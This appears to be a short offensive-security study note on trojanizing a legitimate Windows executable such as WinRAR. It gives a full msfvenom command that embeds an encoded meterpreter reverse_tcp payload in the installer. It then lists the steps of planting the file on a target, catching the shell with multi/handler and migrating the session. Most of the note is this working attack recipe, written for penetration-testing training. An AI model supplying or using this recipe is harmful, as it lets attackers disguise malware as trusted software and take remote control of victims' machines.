---
up: "[[Client-Side Attacks]]"
---

# Injecting Payloads into Windows Portables Executables

- Inject your payload in a legitimate executable file.
	- winrar is a very popular choice

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<my_ip> LPORT=<port> -i 10 -e x86/shikata_ga_nai -f exe [-k] -x wrar.exe > winrar.exe
```

1. Transfer the malicious executable to the target system
2. Start the multi/handler module
3. Execute the executable on the target

> `-k` can be used to preserve legitimate executable functionalities. It doesn't work very often.

```bash
meterpreter > run post/windows/manage/migrate
```
